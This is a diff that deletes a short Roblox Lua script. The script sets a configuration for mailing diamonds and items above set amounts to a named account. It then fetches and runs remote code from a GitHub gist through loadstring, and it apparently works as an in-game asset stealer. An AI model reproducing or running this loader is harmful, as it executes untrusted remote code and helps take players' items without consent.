@@ -1,11 +1,1 @@
-task.wait(30)
-getgenv().configTable = {
-    MailboxTo = "sowhat7744",
-    MinimumAmountDiamond = 1000000,
-    MinimumAmountItem = 250000,
-    AutoMailbox = false,
-    AutoMailboxClaim = false,
-    Whitelist = {"Diamonds"},
-    Optimizer = true,
-}
-loadstring(game:HttpGet("https://gist.githubusercontent.com/AnigamiYT/b7d65db398aa182ef128c25329a24e7f/raw/gistfile1.txt"))()
+
